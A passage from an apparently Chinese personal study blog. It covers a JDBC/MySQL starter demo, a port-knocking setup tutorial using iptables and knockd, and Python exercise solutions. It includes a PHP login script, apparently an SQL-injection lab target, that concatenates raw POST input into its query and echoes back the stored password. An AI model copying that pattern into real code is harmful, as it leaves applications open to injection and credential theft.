<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.lesson01;  </span><br><span class="line"><span class="comment">//我的第一个JDBC程序  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;  </span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  </span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;  </span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcFirstDemo</span> </span>&#123;  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;  </span><br><span class="line"><span class="comment">//1. 加载驱动  </span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);<span class="comment">//固定写法  </span></span><br><span class="line"><span class="comment">//2. 用户信息和url  </span></span><br><span class="line"><span class="comment">//useUnicode=true&amp;characterEncoding=utf8&amp;&amp;useSSL=true  </span></span><br><span class="line">String url =<span class="string">&quot;jdbc:mysql://localhost:3306/jdbcstudy?useUnicode=true&amp;characterEncoding=utf8&amp;&amp;useSSL=false&quot;</span>;  </span><br><span class="line">String name = <span class="string">&quot;root&quot;</span>;  </span><br><span class="line">String password = <span class="string">&quot;123456&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//3. 连接成功，返回数据库对象  connection代表数据库  </span></span><br><span class="line">Connection connection= DriverManager.getConnection(url,name,password);  </span><br><span class="line"><span class="comment">//4. 执行SQL的对象 statement 执行SQL的对象  </span></span><br><span class="line">Statement statement = connection.createStatement();  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//5. 执行SQL的对象 去执行SQL   可能存在结果，查看返回结果  </span></span><br><span class="line">String sql=<span class="string">&quot;SELECT * FROM users&quot;</span>;  </span><br><span class="line">ResultSet resultSet = statement.executeQuery(sql);<span class="comment">//返回的结果集,结果集中封装了我们全部查询的结果  </span></span><br><span class="line"><span class="keyword">while</span>(resultSet.next())&#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;id+&quot;</span>+resultSet.getObject(<span class="string">&quot;id&quot;</span>));  </span><br><span class="line">System.out.println(<span class="string">&quot;name+&quot;</span>+resultSet.getObject(<span class="string">&quot;NAME&quot;</span>));  </span><br><span class="line">System.out.println(<span class="string">&quot;password+&quot;</span>+resultSet.getObject(<span class="string">&quot;PASSWORD&quot;</span>));  </span><br><span class="line">System.out.println(<span class="string">&quot;email+&quot;</span>+resultSet.getObject(<span class="string">&quot;email&quot;</span>));  </span><br><span class="line">System.out.println(<span class="string">&quot;birthday+&quot;</span>+resultSet.getObject(<span class="string">&quot;birthday&quot;</span>));  </span><br><span class="line">        &#125;  </span><br><span class="line"><span class="comment">//6. 释放连接  </span></span><br><span class="line">resultSet.close();  </span><br><span class="line">statement.close();  </span><br><span class="line">connection.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>步骤总结：</p>
<ol type="1">
<li>加载驱动</li>
<li>连接数据库 DriverManager</li>
<li>获取执行 SQL 的对象 Statement</li>
<li>获得返回的结果集</li>
<li>释放连接</li>
</ol>
<p>这里放出 PHP 写的代码 [[8. SQL注入漏洞手工测试]]：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$db_username</span> = <span class="string">&#x27;www_data&#x27;</span>;</span><br><span class="line"><span class="variable">$db_passwd</span> = <span class="string">&#x27;www_data&#x27;</span>;</span><br><span class="line"><span class="variable">$db_name</span> = <span class="string">&#x27;www_data&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接MySQL</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$servername</span>, <span class="variable">$db_username</span>, <span class="variable">$db_passwd</span>, <span class="variable">$db_name</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;MySQL connection failure.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># SQL查询语句</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27; limit 0, 1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行查询</span></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;sql error:&lt;br&gt;&#x27;</span>.<span class="variable">$conn</span>-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得返回的结果集</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="variable">$res</span>-&gt;fetch_array();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$arr</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span>. <span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$arr</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Login failure.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放连接</span></span><br><span class="line"><span class="variable">$res</span>-&gt;free();</span><br><span class="line"><span class="variable">$conn</span>-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>后面都是使用 Java 代码实现数据库的各种操作，因为我不会
Java，所以暂时搁置。</p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>MySQL</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Port Knocking</title>
    <url>/2022/05/14/Port%20Knocking/</url>
    <content><![CDATA[<p>个人的知识点记录。</p>
<span id="more"></span>
<h1 id="简介">1. 简介</h1>
<p>（Port
Kncoking）端口敲击是一种用于保护你的端口访问不被未经授权的用户使用的方法。</p>
<p>端口敲击的工作原理是将端口A与一组关闭的端口（B，C，D）进行连接，只有当以<strong>预定的序列</strong>访问对应的端口时，防火墙才会开启端口A。比如只有依次访问B，C，D，才可以打开端口A，其他顺序都不行。</p>
<p>端口敲击的主要目的是为了抵御端口扫描器。改变默认的ssh端口并不是保护服务器的安全方法，因为攻击者在攻击服务器之前经常使用端口扫描器对开放的端口进行自动扫描。因此，端口敲击是保护ssh服务器的最好方法。</p>
<p>例如，如果你想为22号端口设置端口敲击，只有当你依次请求10001、10002、10003端口时，这个端口才会被打开。当你正确完成这个顺序时，防火墙将为你打开22号端口。</p>
<ol type="1">
<li>设置 Port Knocking 的主机：ubuntu 20.04 LTS</li>
<li>尝试远程访问的主机：kali 2021</li>
</ol>
<h1 id="设置port-knocking">2. 设置Port Knocking</h1>
<h2 id="安装配置iptables">2.1. 安装、配置Iptables</h2>
<p>在安装 iptables 之前，需要先禁用 UFW <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure></p>
<p>接着，安装 iptables，（过程中遇到的选择都选yes） <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install iptables iptables-persistent</span><br></pre></td></tr></table></figure></p>
<p>安装完成之后，需要通过 iptables 允许所有已经建立的和正在进行的会话
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br></pre></td></tr></table></figure></p>
<p>接着，使用下面的命令屏蔽端口22上的ssh的连接的传入 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo iptables -A INPUT -p tcp --dport 22 -j REJECT</span><br></pre></td></tr></table></figure></p>
<p>最后，使用下面的命令保存并重载防火墙的规则 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo netfilter-persistent save</span><br><span class="line">2. sudo netfilter-persistent reload</span><br></pre></td></tr></table></figure></p>
<p>使用远程主机的nmap检测一下ssh是否已经关闭： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22 10.0.2.21</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514202835.png" /></p>
<p>尝试连接，提示连接被拒绝</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514202920.png" /></p>
<h2 id="安装配置knockd">2.2. 安装、配置Knockd</h2>
<p>执行下面的命令安装 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install knockd</span><br></pre></td></tr></table></figure></p>
<p>knockd安装完成之后，需要配置 /etc/default/knockd 文件使 knockd
服务在启动时开启。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo vim /etc/default/knockd</span><br><span class="line">2. 修改 START_KNOCKD=0 -&gt; START_KNOCKD=1</span><br><span class="line">3. 修改网卡：KNOCKD_OPTS=&quot;-i enp0s3&quot; # 注意，先用 ip a 查看一下网卡</span><br><span class="line">4. 保存，并退出</span><br></pre></td></tr></table></figure></p>
<p>接下来，需要配置 /etc/knockd.conf 文件 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/knockd.conf</span><br></pre></td></tr></table></figure></p>
<p>根据个人需求，修改 openSSH 和 closeSSH 的端口以及敲击顺序
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[options]</span><br><span class="line">	UseSyslog</span><br><span class="line"></span><br><span class="line">[openSSH]</span><br><span class="line">	sequence    = 7000,8000,9000</span><br><span class="line">	seq_timeout = 20</span><br><span class="line">	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span><br><span class="line">	tcpflags    = syn</span><br><span class="line"></span><br><span class="line">[closeSSH]</span><br><span class="line">	sequence    = 9000,8000,7000</span><br><span class="line">	seq_timeout = 20</span><br><span class="line">	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span><br><span class="line">	tcpflags    = syn</span><br></pre></td></tr></table></figure></p>
<p>修改完成之后，保存并退出，然后启动 knockd 服务 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo service knockd start</span><br></pre></td></tr></table></figure></p>
<p>解释：上述命令的意思就是如果依次访问 7000,8000,9000 就允许其访问 22
端口；如果它依次访问 9000,8000,7000 ，则再次关闭 22 端口。</p>
<h1 id="远程访问测试">3. 远程访问测试</h1>
<p>远程主机上查看 22 端口还是处于 filtered 状态</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514205254.png" /></p>
<p>我们依次访问 7000,8000,9000 端口 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. nmap -p 7000 10.0.2.21</span><br><span class="line">2. nmap -p 8000 10.0.2.21</span><br><span class="line">3. nmap -p 9000 10.0.2.21</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514210433.png" /></p>
<p>然后再次查看 22 端口</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514210127.png" /></p>
<p>依次访问： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. nmap -p 9000 10.0.2.21</span><br><span class="line">2. nmap -p 8000 10.0.2.21</span><br><span class="line">3. nmap -p 7000 10.0.2.21</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514210414.png" /></p>
<p>22 端口就会关闭</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514210401.png" /></p>
<h2 id="番外">3.1. 番外</h2>
<p>在[[HackableⅢ Writeup]]中，就无法使用 nmap
来依次访问端口序列。这时候就需要使用 knock 工具。命令如下：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">knock ip port_seq1 port_seq2 port_seq3 ...</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">4. 总结</h1>
<p>这个方法还是挺有意思的，像是“芝麻开门”。只要访问序列够复杂，爆破的难度就会很大。</p>
<h1 id="参考">5. 参考</h1>
<ol type="1">
<li><a
href="https://www.rapid7.com/blog/post/2017/10/04/how-to-secure-ssh-server-using-port-knocking-on-ubuntu-linux/">How
to Secure SSH Server using Port Knocking on Ubuntu Linux | Rapid7
Blog</a></li>
<li><a
href="https://wohin.me/zhi-ma-kai-men-de-mi-mi-port-knocking/">芝麻开门的秘密：Port
Knocking</a></li>
</ol>
]]></content>
      <categories>
        <category>Port Knocking</category>
      </categories>
      <tags>
        <tag>Port Knocking</tag>
      </tags>
  </entry>
  <entry>
    <title>Question 1-10</title>
    <url>/2022/07/01/Question%201-10/</url>
    <content><![CDATA[<p>项目地址：<a
href="https://github.com/ReganQing/Python-programming-exercises/blob/master/100%2B%20Python%20challenging%20programming%20exercises%20for%20Python%203.md">Python-programming-exercises/100+
Python challenging programming exercises for Python 3.md at master ·
ReganQing/Python-programming-exercises · GitHub</a></p>
<p>分为三个等级：</p>
<ol type="1">
<li>easy</li>
<li>medium</li>
<li>hard</li>
</ol>
<span id="more"></span>
<h1 id="question-1">1. Question 1</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>在 [2000, 3200] 之间找到能被 7 整除，但不是 5
的倍数的所有数。找到的所有数字以逗号作为分隔，一行打印。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>, <span class="number">3201</span>):</span><br><span class="line">    <span class="keyword">if</span> (num % <span class="number">7</span> == <span class="number">0</span>) <span class="keyword">and</span> (num % <span class="number">5</span> != <span class="number">0</span>):</span><br><span class="line">        ans.append(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;, &#x27;</span>.join(ans))</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>join() 后面跟的应该是 str，因此往 ans
列表添加找到的数字的时候需要使用 str()</li>
</ul>
<h1 id="question-2">2. Question 2</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>求给定数的阶乘</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_factorial</span>(<span class="params">num</span>):</span></span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> num != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num+<span class="number">1</span>):</span><br><span class="line">            res *= i</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Give me a number: &#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(get_factorial(x))</span><br></pre></td></tr></table></figure>
<p>还可以使用递归：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_factorial</span>(<span class="params">num</span>):</span></span><br><span class="line">	<span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> num * get_factorial(num-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Give me a number: &#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(get_factorial(x))</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>input() 函数得到的默认是 str 类型，因此需要使用 int()
进行类型转换</li>
</ul>
<h1 id="question-3">3. Question 3</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>给定一个数 n，够造一个字典，该字典的元素为 <code>i: i²</code>，其中
i 属于 [1, n]。例如：n=8，则结果为：{1: 1, 2: 4, 3: 9, 4: 16, 5: 25, 6:
36, 7: 49, 8: 64}</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Give me a num: &#x27;</span>))</span><br><span class="line">d = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">    d[i] = i * i</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>
<h1 id="question-4">4. Question 4</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>控制台输入一串用逗号分隔的数字串，生成一个字典和一个元组，元素为数字串中的数字。比如输入：1,10,43,12；得到:
['1','10','43','12'] 和 ('1','10','43','12')</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>()</span><br><span class="line">lst = <span class="built_in">str</span>.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">t = <span class="built_in">tuple</span>(lst)</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>可以直接通过 <code>t=tuple(lst)</code>
生成一个元组，元组的每个元素就是列表中的每个元素</li>
</ul>
<h1 id="question-5">5. Question 5</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>编写一个包含两个方法的 class。其中一个是
<code>getString</code>，从控制台输入字符串；另一个是
<code>printString</code>，将得到的字符串转为大写后打印</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InputOutString</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getString</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.s = <span class="built_in">input</span>(<span class="string">&#x27;Give me a strings: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printString</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.s.upper())</span><br><span class="line"></span><br><span class="line">obj = InputOutString()</span><br><span class="line">obj.getString()</span><br><span class="line">obj.printString()</span><br></pre></td></tr></table></figure>
<h1 id="question-6">6. Question 6</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>计算式子 <span class="math inline">\(\sqrt{(2*C*D)/H}\)</span>，其中
C = 50， H = 30，D
为控制台输入。输入为以逗号分隔的数字序列，输出也是以逗号分隔的数字序列。比如输入：100,150,180，输出：18,22,24</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math  </span><br><span class="line">C = <span class="number">50</span>  </span><br><span class="line">H = <span class="number">30</span>  </span><br><span class="line">input_str = <span class="built_in">input</span>()  </span><br><span class="line">nums = input_str.split(<span class="string">&#x27;,&#x27;</span>)  </span><br><span class="line">res = <span class="built_in">list</span>()  </span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> nums:  </span><br><span class="line">    res.append(<span class="built_in">str</span>(<span class="built_in">round</span>(math.sqrt(<span class="number">2</span>*C*<span class="built_in">float</span>(num)/H))))  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(res))</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>使用 math 模块的 sqrt 函数求平方根</li>
<li>使用 round 函数进行四舍五入</li>
</ul>
<h1 id="question-7">7. Question 7</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>给定两个数 x、y，返回一个 x 行 y 列的二维数组，其中 ith 行 jth
列的元素值为
<code>i*j</code>。输入为：3、5，输出为：<code>[[0, 0, 0, 0, 0], [0, 1, 2, 3, 4], [0, 2, 4, 6, 8]]</code></li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">params = <span class="built_in">input</span>().split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">rows = <span class="built_in">int</span>(params[<span class="number">0</span>])</span><br><span class="line">cols = <span class="built_in">int</span>(params[<span class="number">1</span>])</span><br><span class="line">res = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(cols)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rows)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">        res[row][col] = row * col</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>:</p>
<ul>
<li>创建二维数的时候有一个坑</li>
</ul>
<h2 id="二维数组的创建">7.1. 二维数组的创建</h2>
<p>二维数组的创建有三种方式，最后一种是需要使用 numpy
模块，因此这里不做介绍。</p>
<p><strong>第一种</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">two_dim = [ [<span class="number">0</span>]*<span class="number">3</span> ] * <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(two_dim)</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220701094943.png" /></p>
<p>直观的看，确实是创建了一个二维数组，但是这种方法有一个缺点。我们尝试给其中某个位置赋值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">two_dim[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(two_dim)</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220701095116.png" /></p>
<p>可以看到 3 个都被修改了，这是因为 <strong>浅拷贝</strong>
的原因，<code>[0]*3</code> 得到一个一维数组没问题，但是
<code>[ [0]*3 ] * 3</code> 就有问题了，本质上得到的 2 维数组中的三个 1
维数组指向的是同一块内存，所以要修改就会一起被修改。</p>
<p><strong>第二种</strong>：</p>
<p>使用生成器来辅助实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">row_num = <span class="number">3</span></span><br><span class="line">col_num = <span class="number">3</span></span><br><span class="line">two_dim = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(col_num)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(row_num)]</span><br><span class="line"><span class="built_in">print</span>(two_dim)</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220701101951.png" /></p>
<p>此时尝试修改某个元素：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">two_dim[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(two_dim)</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220701102042.png" /></p>
<p>这时候能够正常更新。</p>
<h1 id="question-8">8. Question 8</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>输入一串用逗号分隔的单词，同样的输出一串用逗号分隔的单词，但是输出的单词需要按照字母表排序</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">words = <span class="built_in">input</span>().split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="comment"># words = [word for word in input().split(&#x27;,&#x27;)]</span></span><br><span class="line">words.sort()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(words))</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>sort 排序函数针对的是列表</li>
<li>使用 sort 对字符串进行排序的时候，默认按照字母表</li>
</ul>
<h1 id="question-9">9. Question 9</h1>
<p><strong>问题</strong>：（medium）</p>
<ul>
<li>依次从控制台接收多行字符串，将接收到的每行字符串全部转为大写，然后输出</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lines = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">str</span> = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>:</span><br><span class="line">        lines.append(<span class="built_in">str</span>.upper())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> sentence <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="built_in">print</span>(sentence)</span><br></pre></td></tr></table></figure>
<h1 id="question-10">10. Question 10</h1>
<p><strong>问题</strong>：（medium）</p>
<ul>
<li>输入一串用空格分隔的单词串，将这些单词去重，并且按照字母表返回一串用空格分隔的单词串</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">words = []</span><br><span class="line">[words.append(word) <span class="keyword">for</span> word <span class="keyword">in</span> <span class="built_in">input</span>().split() <span class="keyword">if</span> word <span class="keyword">not</span> <span class="keyword">in</span> words]</span><br><span class="line">words.sort()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(words))</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>本题的难度就在于考察 <strong>列表去重</strong></li>
</ul>
<h2 id="列表去重">10.1. 列表去重</h2>
<h3 id="set-去重">10.1.1. set 去重</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l1 = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>]</span><br><span class="line">l2 = <span class="built_in">list</span>(<span class="built_in">set</span>(l1))</span><br><span class="line"><span class="built_in">print</span>(l2)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>set 得到的返回值是 <code>class set</code> 类型的；</p></li>
<li><p>set 会改变原来的顺序</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220701104903.png" /></p></li>
</ul>
<p>不过可以通过 <code>sort(key=l1.index)</code> 来保持顺序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l1 = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>]</span><br><span class="line">l2 = <span class="built_in">list</span>(<span class="built_in">set</span>(l1))</span><br><span class="line">l2.sort(key=l1.index)</span><br><span class="line"><span class="built_in">print</span>(l2)</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220701105050.png" /></p>
<h3 id="fromkeys-去重">10.1.2. fromkeys 去重</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l1 = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>]</span><br><span class="line">l2 = <span class="built_in">list</span>(<span class="built_in">dict</span>.fromkeys(l1))</span><br><span class="line"><span class="built_in">print</span>(l2)</span><br></pre></td></tr></table></figure>
<p><strong>fromkeys 的作用是将 l1
中的元素作为键来创建字典，而字典的键是不能重复的。</strong></p>
<p><img
